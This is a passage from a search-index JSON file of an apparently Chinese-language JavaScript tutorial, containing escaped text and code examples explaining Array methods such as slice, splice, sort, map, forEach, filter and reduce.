\u9664\u4e86\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\uff0c concat \u4e5f\u63a5\u53d7\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u6dfb\u52a0\u5230\u76ee\u6807\u6570\u7ec4\u5c3e\u90e8\u3002 1 2 [ 1 , 2 , 3 ]. concat ( 4 , 5 , 6 ) // [1, 2, 3, 4, 5, 6] \u5982\u679c\u6570\u7ec4\u6210\u5458\u5305\u62ec\u5bf9\u8c61\uff0c concat \u65b9\u6cd5\u8fd4\u56de\u5f53\u524d\u6570\u7ec4\u7684\u4e00\u4e2a\u6d45\u62f7\u8d1d\u3002\u6240\u8c13\u201c\u6d45\u62f7\u8d1d\u201d\uff0c\u6307\u7684\u662f\u65b0\u6570\u7ec4\u62f7\u8d1d\u7684\u662f\u5bf9\u8c61\u7684\u5f15\u7528\u3002 1 2 3 4 5 6 7 var obj = { a : 1 }; var oldArray = [ obj ]; var newArray = oldArray . concat (); obj . a = 2 ; newArray [ 0 ]. a // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u539f\u6570\u7ec4\u5305\u542b\u4e00\u4e2a\u5bf9\u8c61\uff0c concat \u65b9\u6cd5\u751f\u6210\u7684\u65b0\u6570\u7ec4\u5305\u542b\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u6240\u4ee5\uff0c\u6539\u53d8\u539f\u5bf9\u8c61\u4ee5\u540e\uff0c\u65b0\u6570\u7ec4\u8ddf\u7740\u6539\u53d8\u3002","title":"concat()"},{"location":"stdlib/array/#reverse","text":"reverse \u65b9\u6cd5\u7528\u4e8e\u98a0\u5012\u6392\u5217\u6570\u7ec4\u5143\u7d20\uff0c\u8fd4\u56de\u6539\u53d8\u540e\u7684\u6570\u7ec4\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u5c06\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 var a = [ 'a' , 'b' , 'c' ]; a . reverse () // [\"c\", \"b\", \"a\"] a // [\"c\", \"b\", \"a\"]","title":"reverse()"},{"location":"stdlib/array/#slice","text":"slice() \u65b9\u6cd5\u7528\u4e8e\u63d0\u53d6\u76ee\u6807\u6570\u7ec4\u7684\u4e00\u90e8\u5206\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u6570\u7ec4\uff0c\u539f\u6570\u7ec4\u4e0d\u53d8\u3002 1 arr . slice ( start , end ); \u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u8d77\u59cb\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff0c\u4f1a\u5305\u62ec\u5728\u8fd4\u56de\u7684\u65b0\u6570\u7ec4\u4e4b\u4e2d\uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u7ec8\u6b62\u4f4d\u7f6e\uff08\u4f46\u8be5\u4f4d\u7f6e\u7684\u5143\u7d20\u672c\u8eab\u4e0d\u5305\u62ec\u5728\u5185\uff09\u3002\u5982\u679c\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5219\u4e00\u76f4\u8fd4\u56de\u5230\u539f\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u6210\u5458\u3002 1 2 3 4 5 6 7 var a = [ 'a' , 'b' , 'c' ]; a . slice ( 0 ) // [\"a\", \"b\", \"c\"] a . slice ( 1 ) // [\"b\", \"c\"] a . slice ( 1 , 2 ) // [\"b\"] a . slice ( 2 , 6 ) // [\"c\"] a . slice () // [\"a\", \"b\", \"c\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6700\u540e\u4e00\u4e2a\u4f8b\u5b50 slice() \u6ca1\u6709\u53c2\u6570\uff0c\u5b9e\u9645\u4e0a\u7b49\u4e8e\u8fd4\u56de\u4e00\u4e2a\u539f\u6570\u7ec4\u7684\u62f7\u8d1d\u3002 \u5982\u679c slice() \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u8d1f\u6570\uff0c\u5219\u8868\u793a\u5012\u6570\u8ba1\u7b97\u7684\u4f4d\u7f6e\u3002 1 2 3 var a = [ 'a' , 'b' , 'c' ]; a . slice ( - 2 ) // [\"b\", \"c\"] a . slice ( - 2 , - 1 ) // [\"b\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c -2 \u8868\u793a\u5012\u6570\u8ba1\u7b97\u7684\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\uff0c -1 \u8868\u793a\u5012\u6570\u8ba1\u7b97\u7684\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5927\u4e8e\u7b49\u4e8e\u6570\u7ec4\u957f\u5ea6\uff0c\u6216\u8005\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5c0f\u4e8e\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5219\u8fd4\u56de\u7a7a\u6570\u7ec4\u3002 1 2 3 var a = [ 'a' , 'b' , 'c' ]; a . slice ( 4 ) // [] a . slice ( 2 , 1 ) // [] slice() \u65b9\u6cd5\u7684\u4e00\u4e2a\u91cd\u8981\u5e94\u7528\uff0c\u662f\u5c06\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002 1 2 3 4 5 Array . prototype . slice . call ({ 0 : 'a' , 1 : 'b' , length : 2 }) // ['a', 'b'] Array . prototype . slice . call ( document . querySelectorAll ( \"div\" )); Array . prototype . slice . call ( arguments ); \u4e0a\u9762\u4ee3\u7801\u7684\u53c2\u6570\u90fd\u4e0d\u662f\u6570\u7ec4\uff0c\u4f46\u662f\u901a\u8fc7 call \u65b9\u6cd5\uff0c\u5728\u5b83\u4eec\u4e0a\u9762\u8c03\u7528 slice() \u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u628a\u5b83\u4eec\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002","title":"slice()"},{"location":"stdlib/array/#splice","text":"splice() \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u539f\u6570\u7ec4\u7684\u4e00\u90e8\u5206\u6210\u5458\uff0c\u5e76\u53ef\u4ee5\u5728\u5220\u9664\u7684\u4f4d\u7f6e\u6dfb\u52a0\u65b0\u7684\u6570\u7ec4\u6210\u5458\uff0c\u8fd4\u56de\u503c\u662f\u88ab\u5220\u9664\u7684\u5143\u7d20\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 arr . splice ( start , count , addElement1 , addElement2 , ...); splice \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5220\u9664\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u88ab\u5220\u9664\u7684\u5143\u7d20\u4e2a\u6570\u3002\u5982\u679c\u540e\u9762\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\uff0c\u5219\u8868\u793a\u8fd9\u4e9b\u5c31\u662f\u8981\u88ab\u63d2\u5165\u6570\u7ec4\u7684\u65b0\u5143\u7d20\u3002 1 2 3 var a = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' ]; a . splice ( 4 , 2 ) // [\"e\", \"f\"] a // [\"a\", \"b\", \"c\", \"d\"] \u4e0a\u9762\u4ee3\u7801\u4ece\u539f\u6570\u7ec44\u53f7\u4f4d\u7f6e\uff0c\u5220\u9664\u4e86\u4e24\u4e2a\u6570\u7ec4\u6210\u5458\u3002 1 2 3 var a = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' ]; a . splice ( 4 , 2 , 1 , 2 ) // [\"e\", \"f\"] a // [\"a\", \"b\", \"c\", \"d\", 1, 2] \u4e0a\u9762\u4ee3\u7801\u9664\u4e86\u5220\u9664\u6210\u5458\uff0c\u8fd8\u63d2\u5165\u4e86\u4e24\u4e2a\u65b0\u6210\u5458\u3002 \u8d77\u59cb\u4f4d\u7f6e\u5982\u679c\u662f\u8d1f\u6570\uff0c\u5c31\u8868\u793a\u4ece\u5012\u6570\u4f4d\u7f6e\u5f00\u59cb\u5220\u9664\u3002 1 2 var a = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' ]; a . splice ( - 4 , 2 ) // [\"c\", \"d\"] \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u4ece\u5012\u6570\u7b2c\u56db\u4e2a\u4f4d\u7f6e c \u5f00\u59cb\u5220\u9664\u4e24\u4e2a\u6210\u5458\u3002 \u5982\u679c\u53ea\u662f\u5355\u7eaf\u5730\u63d2\u5165\u5143\u7d20\uff0c splice \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u8bbe\u4e3a 0 \u3002 1 2 3 4 var a = [ 1 , 1 , 1 ]; a . splice ( 1 , 0 , 2 ) // [] a // [1, 2, 1, 1] \u5982\u679c\u53ea\u63d0\u4f9b\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u7b49\u540c\u4e8e\u5c06\u539f\u6570\u7ec4\u5728\u6307\u5b9a\u4f4d\u7f6e\u62c6\u5206\u6210\u4e24\u4e2a\u6570\u7ec4\u3002 1 2 3 var a = [ 1 , 2 , 3 , 4 ]; a . splice ( 2 ) // [3, 4] a // [1, 2]","title":"splice()"},{"location":"stdlib/array/#sort","text":"sort \u65b9\u6cd5\u5bf9\u6570\u7ec4\u6210\u5458\u8fdb\u884c\u6392\u5e8f\uff0c\u9ed8\u8ba4\u662f\u6309\u7167\u5b57\u5178\u987a\u5e8f\u6392\u5e8f\u3002\u6392\u5e8f\u540e\uff0c\u539f\u6570\u7ec4\u5c06\u88ab\u6539\u53d8\u3002 1 2 3 4 5 6 7 8 9 10 11 [ 'd' , 'c' , 'b' , 'a' ]. sort () // ['a', 'b', 'c', 'd'] [ 4 , 3 , 2 , 1 ]. sort () // [1, 2, 3, 4] [ 11 , 101 ]. sort () // [101, 11] [ 10111 , 1101 , 111 ]. sort () // [10111, 1101, 111] \u4e0a\u9762\u4ee3\u7801\u7684\u6700\u540e\u4e24\u4e2a\u4f8b\u5b50\uff0c\u9700\u8981\u7279\u6b8a\u6ce8\u610f\u3002 sort() \u65b9\u6cd5\u4e0d\u662f\u6309\u7167\u5927\u5c0f\u6392\u5e8f\uff0c\u800c\u662f\u6309\u7167\u5b57\u5178\u987a\u5e8f\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6570\u503c\u4f1a\u88ab\u5148\u8f6c\u6210\u5b57\u7b26\u4e32\uff0c\u518d\u6309\u7167\u5b57\u5178\u987a\u5e8f\u8fdb\u884c\u6bd4\u8f83\uff0c\u6240\u4ee5 101 \u6392\u5728 11 \u7684\u524d\u9762\u3002 \u5982\u679c\u60f3\u8ba9 sort \u65b9\u6cd5\u6309\u7167\u81ea\u5b9a\u4e49\u65b9\u5f0f\u6392\u5e8f\uff0c\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u3002 1 2 3 4 [ 10111 , 1101 , 111 ]. sort ( function ( a , b ) { return a - b ; }) // [111, 1101, 10111] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c sort \u7684\u53c2\u6570\u51fd\u6570\u672c\u8eab\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u8fdb\u884c\u6bd4\u8f83\u7684\u4e24\u4e2a\u6570\u7ec4\u6210\u5458\u3002\u5982\u679c\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u503c\u5927\u4e8e 0 \uff0c\u8868\u793a\u7b2c\u4e00\u4e2a\u6210\u5458\u6392\u5728\u7b2c\u4e8c\u4e2a\u6210\u5458\u540e\u9762\uff1b\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u90fd\u662f\u7b2c\u4e00\u4e2a\u5143\u7d20\u6392\u5728\u7b2c\u4e8c\u4e2a\u5143\u7d20\u524d\u9762\u3002 1 2 3 4 5 6 7 8 9 10 11 12 [ { name : \"\u5f20\u4e09\" , age : 30 }, { name : \"\u674e\u56db\" , age : 24 }, { name : \"\u738b\u4e94\" , age : 28 } ]. sort ( function ( o1 , o2 ) { return o1 . age - o2 . age ; }) // [ // { name: \"\u674e\u56db\", age: 24 }, // { name: \"\u738b\u4e94\", age: 28 }, // { name: \"\u5f20\u4e09\", age: 30 } // ] \u6ce8\u610f\uff0c\u81ea\u5b9a\u4e49\u7684\u6392\u5e8f\u51fd\u6570\u5e94\u8be5\u8fd4\u56de\u6570\u503c\uff0c\u5426\u5219\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u53ef\u80fd\u6709\u4e0d\u540c\u7684\u5b9e\u73b0\uff0c\u4e0d\u80fd\u4fdd\u8bc1\u7ed3\u679c\u90fd\u4e00\u81f4\u3002 1 2 3 4 5 // bad [ 1 , 4 , 2 , 6 , 0 , 6 , 2 , 6 ]. sort (( a , b ) => a > b ) // good [ 1 , 4 , 2 , 6 , 0 , 6 , 2 , 6 ]. sort (( a , b ) => a - b ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u524d\u4e00\u79cd\u6392\u5e8f\u7b97\u6cd5\u8fd4\u56de\u7684\u662f\u5e03\u5c14\u503c\uff0c\u8fd9\u662f\u4e0d\u63a8\u8350\u4f7f\u7528\u7684\u3002\u540e\u4e00\u79cd\u662f\u6570\u503c\uff0c\u624d\u662f\u66f4\u597d\u7684\u5199\u6cd5\u3002","title":"sort()"},{"location":"stdlib/array/#map","text":"map() \u65b9\u6cd5\u5c06\u6570\u7ec4\u7684\u6240\u6709\u6210\u5458\u4f9d\u6b21\u4f20\u5165\u53c2\u6570\u51fd\u6570\uff0c\u7136\u540e\u628a\u6bcf\u4e00\u6b21\u7684\u6267\u884c\u7ed3\u679c\u7ec4\u6210\u4e00\u4e2a\u65b0\u6570\u7ec4\u8fd4\u56de\u3002 1 2 3 4 5 6 7 8 9 var numbers = [ 1 , 2 , 3 ]; numbers . map ( function ( n ) { return n + 1 ; }); // [2, 3, 4] numbers // [1, 2, 3] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c numbers \u6570\u7ec4\u7684\u6240\u6709\u6210\u5458\u4f9d\u6b21\u6267\u884c\u53c2\u6570\u51fd\u6570\uff0c\u8fd0\u884c\u7ed3\u679c\u7ec4\u6210\u4e00\u4e2a\u65b0\u6570\u7ec4\u8fd4\u56de\uff0c\u539f\u6570\u7ec4\u6ca1\u6709\u53d8\u5316\u3002 map() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u3002\u8be5\u51fd\u6570\u8c03\u7528\u65f6\uff0c map() \u65b9\u6cd5\u5411\u5b83\u4f20\u5165\u4e09\u4e2a\u53c2\u6570\uff1a\u5f53\u524d\u6210\u5458\u3001\u5f53\u524d\u4f4d\u7f6e\u548c\u6570\u7ec4\u672c\u8eab\u3002 1 2 3 4 [ 1 , 2 , 3 ]. map ( function ( elem , index , arr ) { return elem * index ; }); // [0, 2, 6] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c map() \u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u6709\u4e09\u4e2a\u53c2\u6570\uff0c elem \u4e3a\u5f53\u524d\u6210\u5458\u7684\u503c\uff0c index \u4e3a\u5f53\u524d\u6210\u5458\u7684\u4f4d\u7f6e\uff0c arr \u4e3a\u539f\u6570\u7ec4\uff08 [1, 2, 3] \uff09\u3002 map() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u6765\u7ed1\u5b9a\u56de\u8c03\u51fd\u6570\u5185\u90e8\u7684 this \u53d8\u91cf\uff08\u8be6\u89c1\u300athis \u53d8\u91cf\u300b\u4e00\u7ae0\uff09\u3002 1 2 3 4 5 6 var arr = [ 'a' , 'b' , 'c' ]; [ 1 , 2 ]. map ( function ( e ) { return this [ e ]; }, arr ) // ['b', 'c'] \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7 map() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5c06\u56de\u8c03\u51fd\u6570\u5185\u90e8\u7684 this \u5bf9\u8c61\uff0c\u6307\u5411 arr \u6570\u7ec4\u3002 \u5982\u679c\u6570\u7ec4\u6709\u7a7a\u4f4d\uff0c map() \u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u5728\u8fd9\u4e2a\u4f4d\u7f6e\u4e0d\u4f1a\u6267\u884c\uff0c\u4f1a\u8df3\u8fc7\u6570\u7ec4\u7684\u7a7a\u4f4d\u3002 1 2 3 4 5 var f = function ( n ) { return 'a' }; [ 1 , undefined , 2 ]. map ( f ) // [\"a\", \"a\", \"a\"] [ 1 , null , 2 ]. map ( f ) // [\"a\", \"a\", \"a\"] [ 1 , , 2 ]. map ( f ) // [\"a\", , \"a\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c map() \u65b9\u6cd5\u4e0d\u4f1a\u8df3\u8fc7 undefined \u548c null \uff0c\u4f46\u662f\u4f1a\u8df3\u8fc7\u7a7a\u4f4d\u3002","title":"map()"},{"location":"stdlib/array/#foreach","text":"forEach() \u65b9\u6cd5\u4e0e map() \u65b9\u6cd5\u5f88\u76f8\u4f3c\uff0c\u4e5f\u662f\u5bf9\u6570\u7ec4\u7684\u6240\u6709\u6210\u5458\u4f9d\u6b21\u6267\u884c\u53c2\u6570\u51fd\u6570\u3002\u4f46\u662f\uff0c forEach() \u65b9\u6cd5\u4e0d\u8fd4\u56de\u503c\uff0c\u53ea\u7528\u6765\u64cd\u4f5c\u6570\u636e\u3002\u8fd9\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6570\u7ec4\u904d\u5386\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u5f97\u5230\u8fd4\u56de\u503c\uff0c\u90a3\u4e48\u4f7f\u7528 map() \u65b9\u6cd5\uff0c\u5426\u5219\u4f7f\u7528 forEach() \u65b9\u6cd5\u3002 forEach() \u7684\u7528\u6cd5\u4e0e map() \u65b9\u6cd5\u4e00\u81f4\uff0c\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u540c\u6837\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff1a\u5f53\u524d\u503c\u3001\u5f53\u524d\u4f4d\u7f6e\u3001\u6574\u4e2a\u6570\u7ec4\u3002 1 2 3 4 5 6 7 8 function log ( element , index , array ) { console . log ( '[' + index + '] = ' + element ); } [ 2 , 5 , 9 ]. forEach ( log ); // [0] = 2 // [1] = 5 // [2] = 9 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c forEach() \u904d\u5386\u6570\u7ec4\u4e0d\u662f\u4e3a\u4e86\u5f97\u5230\u8fd4\u56de\u503c\uff0c\u800c\u662f\u4e3a\u4e86\u5728\u5c4f\u5e55\u8f93\u51fa\u5185\u5bb9\uff0c\u6240\u4ee5\u4e0d\u5fc5\u4f7f\u7528 map() \u65b9\u6cd5\u3002 forEach() \u65b9\u6cd5\u4e5f\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7ed1\u5b9a\u53c2\u6570\u51fd\u6570\u7684 this \u53d8\u91cf\u3002 1 2 3 4 5 6 7 var out = []; [ 1 , 2 , 3 ]. forEach ( function ( elem ) { this . push ( elem * elem ); }, out ); out // [1, 4, 9] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7a7a\u6570\u7ec4 out \u662f forEach() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7ed3\u679c\uff0c\u56de\u8c03\u51fd\u6570\u5185\u90e8\u7684 this \u5173\u952e\u5b57\u5c31\u6307\u5411 out \u3002 \u6ce8\u610f\uff0c forEach() \u65b9\u6cd5\u65e0\u6cd5\u4e2d\u65ad\u6267\u884c\uff0c\u603b\u662f\u4f1a\u5c06\u6240\u6709\u6210\u5458\u904d\u5386\u5b8c\u3002\u5982\u679c\u5e0c\u671b\u7b26\u5408\u67d0\u79cd\u6761\u4ef6\u65f6\uff0c\u5c31\u4e2d\u65ad\u904d\u5386\uff0c\u8981\u4f7f\u7528 for \u5faa\u73af\u3002 1 2 3 4 5 6 7 var arr = [ 1 , 2 , 3 ]; for ( var i = 0 ; i < arr . length ; i ++ ) { if ( arr [ i ] === 2 ) break ; console . log ( arr [ i ]); } // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6267\u884c\u5230\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u6210\u5458\u65f6\uff0c\u5c31\u4f1a\u4e2d\u65ad\u6267\u884c\u3002 forEach() \u65b9\u6cd5\u505a\u4e0d\u5230\u8fd9\u4e00\u70b9\u3002 forEach() \u65b9\u6cd5\u4e5f\u4f1a\u8df3\u8fc7\u6570\u7ec4\u7684\u7a7a\u4f4d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var log = function ( n ) { console . log ( n + 1 ); }; [ 1 , undefined , 2 ]. forEach ( log ) // 2 // NaN // 3 [ 1 , null , 2 ]. forEach ( log ) // 2 // 1 // 3 [ 1 , , 2 ]. forEach ( log ) // 2 // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c forEach() \u65b9\u6cd5\u4e0d\u4f1a\u8df3\u8fc7 undefined \u548c null \uff0c\u4f46\u4f1a\u8df3\u8fc7\u7a7a\u4f4d\u3002","title":"forEach()"},{"location":"stdlib/array/#filter","text":"filter() \u65b9\u6cd5\u7528\u4e8e\u8fc7\u6ee4\u6570\u7ec4\u6210\u5458\uff0c\u6ee1\u8db3\u6761\u4ef6\u7684\u6210\u5458\u7ec4\u6210\u4e00\u4e2a\u65b0\u6570\u7ec4\u8fd4\u56de\u3002 \u5b83\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u6240\u6709\u6570\u7ec4\u6210\u5458\u4f9d\u6b21\u6267\u884c\u8be5\u51fd\u6570\uff0c\u8fd4\u56de\u7ed3\u679c\u4e3a true \u7684\u6210\u5458\u7ec4\u6210\u4e00\u4e2a\u65b0\u6570\u7ec4\u8fd4\u56de\u3002\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 [ 1 , 2 , 3 , 4 , 5 ]. filter ( function ( elem ) { return ( elem > 3 ); }) // [4, 5] \u4e0a\u9762\u4ee3\u7801\u5c06\u5927\u4e8e 3 \u7684\u6570\u7ec4\u6210\u5458\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u65b0\u6570\u7ec4\u8fd4\u56de\u3002 1 2 3 4 var arr = [ 0 , 1 , 'a' , false ]; arr . filter ( Boolean ) // [1, \"a\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c filter() \u65b9\u6cd5\u8fd4\u56de\u6570\u7ec4 arr \u91cc\u9762\u6240\u6709\u5e03\u5c14\u503c\u4e3a true \u7684\u6210\u5458\u3002 filter() \u65b9\u6cd5\u7684\u53c2\u6570\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff1a\u5f53\u524d\u6210\u5458\uff0c\u5f53\u524d\u4f4d\u7f6e\u548c\u6574\u4e2a\u6570\u7ec4\u3002 1 2 3 4 [ 1 , 2 , 3 , 4 , 5 ]. filter ( function ( elem , index , arr ) { return index % 2 === 0 ; }); // [1, 3, 5] \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de\u5076\u6570\u4f4d\u7f6e\u7684\u6210\u5458\u7ec4\u6210\u7684\u65b0\u6570\u7ec4\u3002 filter() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u6765\u7ed1\u5b9a\u53c2\u6570\u51fd\u6570\u5185\u90e8\u7684 this \u53d8\u91cf\u3002 1 2 3 4 5 6 7 var obj = { MAX : 3 }; var myFilter = function ( item ) { if ( item > this . MAX ) return true ; }; var arr = [ 2 , 8 , 3 , 4 , 1 , 3 , 2 , 9 ]; arr . filter ( myFilter , obj ) // [8, 4, 9] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8fc7\u6ee4\u5668 myFilter() \u5185\u90e8\u6709 this \u53d8\u91cf\uff0c\u5b83\u53ef\u4ee5\u88ab filter() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 obj \u7ed1\u5b9a\uff0c\u8fd4\u56de\u5927\u4e8e 3 \u7684\u6210\u5458\u3002","title":"filter()"},{"location":"stdlib/array/#someevery","text":"\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7c7b\u4f3c\u201c\u65ad\u8a00\u201d\uff08assert\uff09\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5224\u65ad\u6570\u7ec4\u6210\u5458\u662f\u5426\u7b26\u5408\u67d0\u79cd\u6761\u4ef6\u3002 \u5b83\u4eec\u63a5\u53d7\u4e00\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u6240\u6709\u6570\u7ec4\u6210\u5458\u4f9d\u6b21\u6267\u884c\u8be5\u51fd\u6570\u3002\u8be5\u51fd\u6570\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff1a\u5f53\u524d\u6210\u5458\u3001\u5f53\u524d\u4f4d\u7f6e\u548c\u6574\u4e2a\u6570\u7ec4\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002 some \u65b9\u6cd5\u662f\u53ea\u8981\u4e00\u4e2a\u6210\u5458\u7684\u8fd4\u56de\u503c\u662f true \uff0c\u5219\u6574\u4e2a some \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u5c31\u662f true \uff0c\u5426\u5219\u8fd4\u56de false \u3002 1 2 3 4 5 var arr = [ 1 , 2 , 3 , 4 , 5 ]; arr . some ( function ( elem , index , arr ) { return elem >= 3 ; }); // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u6570\u7ec4 arr \u6709\u4e00\u4e2a\u6210\u5458\u5927\u4e8e\u7b49\u4e8e3\uff0c some \u65b9\u6cd5\u5c31\u8fd4\u56de true \u3002 every \u65b9\u6cd5\u662f\u6240\u6709\u6210\u5458\u7684\u8fd4\u56de\u503c\u90fd\u662f true \uff0c\u6574\u4e2a every \u65b9\u6cd5\u624d\u8fd4\u56de true \uff0c\u5426\u5219\u8fd4\u56de false \u3002 1 2 3 4 5 var arr = [ 1 , 2 , 3 , 4 , 5 ]; arr . every ( function ( elem , index , arr ) { return elem >= 3 ; }); // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4 arr \u5e76\u975e\u6240\u6709\u6210\u5458\u5927\u4e8e\u7b49\u4e8e 3 \uff0c\u6240\u4ee5\u8fd4\u56de false \u3002 \u6ce8\u610f\uff0c\u5bf9\u4e8e\u7a7a\u6570\u7ec4\uff0c some \u65b9\u6cd5\u8fd4\u56de false \uff0c every \u65b9\u6cd5\u8fd4\u56de true \uff0c\u56de\u8c03\u51fd\u6570\u90fd\u4e0d\u4f1a\u6267\u884c\u3002 1 2 3 4 function isEven ( x ) { return x % 2 === 0 } []. some ( isEven ) // false []. every ( isEven ) // true some \u548c every \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u6765\u7ed1\u5b9a\u53c2\u6570\u51fd\u6570\u5185\u90e8\u7684 this \u53d8\u91cf\u3002","title":"some()\uff0cevery()"},{"location":"stdlib/array/#reducereduceright","text":"reduce() \u65b9\u6cd5\u548c reduceRight() \u65b9\u6cd5\u4f9d\u6b21\u5904\u7406\u6570\u7ec4\u7684\u6bcf\u4e2a\u6210\u5458\uff0c\u6700\u7ec8\u7d2f\u8ba1\u4e3a\u4e00\u4e2a\u503c\u3002\u5b83\u4eec\u7684\u5dee\u522b\u662f\uff0c reduce() \u662f\u4ece\u5de6\u5230\u53f3\u5904\u7406\uff08\u4ece\u7b2c\u4e00\u4e2a\u6210\u5458\u5230\u6700\u540e\u4e00\u4e2a\u6210\u5458\uff09\uff0c reduceRight() \u5219\u662f\u4ece\u53f3\u5230\u5de6\uff08\u4ece\u6700\u540e\u4e00\u4e2a\u6210\u5458\u5230\u7b2c\u4e00\u4e2a\u6210\u5458\uff09\uff0c\u5176\u4ed6\u5b8c\u5168\u4e00\u6837\u3002 1 2 3 4 5 6 7 8 9 [ 1 , 2 , 3 , 4 , 5 ]. reduce ( function ( a , b ) { console . log ( a , b ); return a + b ; }) // 1 2 // 3 3 // 6 4 // 10 5 //\u6700\u540e\u7ed3\u679c\uff1a15 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c reduce() \u65b9\u6cd5\u7528\u6765\u6c42\u51fa\u6570\u7ec4\u6240\u6709\u6210\u5458\u7684\u548c\u3002 reduce() 